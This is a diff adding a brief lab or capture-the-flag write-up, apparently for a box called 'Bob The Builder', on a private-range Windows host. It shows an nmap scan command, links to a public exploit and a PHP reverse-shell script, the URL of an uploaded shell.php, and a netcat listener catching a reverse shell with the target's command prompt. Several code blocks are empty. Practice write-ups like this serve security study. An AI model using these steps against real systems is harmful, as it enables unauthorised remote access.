@@ -1,0 +1,43 @@
+
+
+Bob The Builder
+
+
+#Enumeration 192.168.40.150
+
+Sorry I can't find the output of nmap (but simple scan, nmap -sC -sV 192.168.40.150)
+
+
+```
+
+```
+Exploit
+
+https://www.exploit-db.com/exploits/40390
+
+PHP shell (recommend)
+
+https://github.com/Dhayalanb/windows-php-reverse-shell
+
+URL
+
+https://192.168.40.150:481/build/files/shell.php
+
+```
+
+```
+
+root@kali:~/Downloads# nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [xxxxxx] from (UNKNOWN) [192.168.40.150] 49674
+Microsoft  Windows [Version 10.0.17763.316]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\Temp>
+
+```
+
+```
+
+
+
